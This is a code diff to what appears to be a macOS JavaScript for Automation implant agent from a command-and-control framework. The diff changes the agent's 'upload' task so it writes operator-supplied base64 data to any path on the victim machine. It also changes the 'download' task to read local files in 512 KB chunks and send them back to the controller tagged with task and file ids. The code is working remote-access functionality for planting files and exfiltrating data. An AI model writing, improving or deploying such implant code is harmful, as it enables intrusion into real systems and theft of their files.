@@ -337,13 +337,18 @@ convert_to_nsdata = function(strData){
     var tmpString = $.NSString.alloc.initWithCStringEncoding(strData, $.NSData.NSUnicodeStringEncoding);
     return tmpString.dataUsingEncoding($.NSData.NSUTF16StringEncoding);
 }
-write_text_to_file = function(data, file_path){
+write_data_to_file = function(data, file_path){
     try{
-        var open_file = currentApp.openForAccess(Path(file_path), {writePermission: true});
-        currentApp.setEof(open_file, { to: 0 }); //clear the current file
-        currentApp.write(data, { to: open_file, startingAt: currentApp.getEof(open_file) });
-        currentApp.closeAccess(open_file);
-        return "file written";
+        //var open_file = currentApp.openForAccess(Path(file_path), {writePermission: true});
+        //currentApp.setEof(open_file, { to: 0 }); //clear the current file
+        //currentApp.write(data, { to: open_file, startingAt: currentApp.getEof(open_file) });
+        //currentApp.closeAccess(open_file);
+        if (data.writeToFileAtomically($(file_path), true)){
+            return "file written";
+        }
+        else{
+            return "failed to write file";
+        }
      }
      catch(error){
         return "failed to write to file";
@@ -504,14 +509,14 @@ sleepWakeUp = function(t){
                 var file_path = split_params.slice(1, ).join(" ");
                 var decoded_data = $.NSData.alloc.initWithBase64Encoding($(file_data));
                 var file_data = $.NSString.alloc.initWithDataEncoding(decoded_data, $.NSUTF8StringEncoding).js;
-                output = write_text_to_file(file_data, file_path);
+                output = write_data_to_file(decoded_data, file_path);
 
 			}
 			else if(command == "download"){
                 // download just has one parameter of the path of the file to download
                 if( does_file_exist(params)){
                     var offset = 0;
-                    var chunkSize = 3500;
+                    var chunkSize = 512000; //3500;
                     var handle = $.NSFileHandle.fileHandleForReadingAtPath(params);
                     // Get the file size by seeking;
                     var fileSize = handle.seekToEndOfFile;
@@ -524,7 +529,7 @@ sleepWakeUp = function(t){
                         handle.seekToFileOffset(0);
                         var currentChunk = 1;
                         var data = handle.readDataOfLength(chunkSize);
-                        while(data.length > 0 && offset < fileSize){
+                        while(parseInt(data.length) > 0 && offset < fileSize){
                             // send a chunk
                             var fileData = JSON.stringify({'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'task': task.id, 'file_id': registerFile['id']});
                             fileData = convert_to_nsdata(fileData);
